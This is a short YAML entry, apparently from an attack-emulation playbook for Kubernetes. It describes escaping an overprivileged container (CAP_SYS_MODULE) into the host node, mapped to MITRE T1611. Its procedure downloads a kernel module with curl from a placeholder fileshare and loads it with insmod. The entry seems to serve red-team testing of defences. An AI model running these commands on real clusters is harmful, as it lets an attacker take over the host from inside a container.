name: Escape container via kernel module 🚧
description: Load a kernel module from within an overprivileged container to breakout into the node.
tactic: "Privilege Escalation"
techniques: ["Escape to Host", T1611]
staatus: disabled
preconditions:
  "kind": Session
  "Pod.securityContext.privileged": true
  "Container.securityContext.capabilities": CAP_SYS_MODULE
effects: []
command: "EscapeHost"
procedures:
  - key: curl
    command: |
      curl -O ${FILESHARE}/${MODULE};
      insmod ${MODULE}
defend:
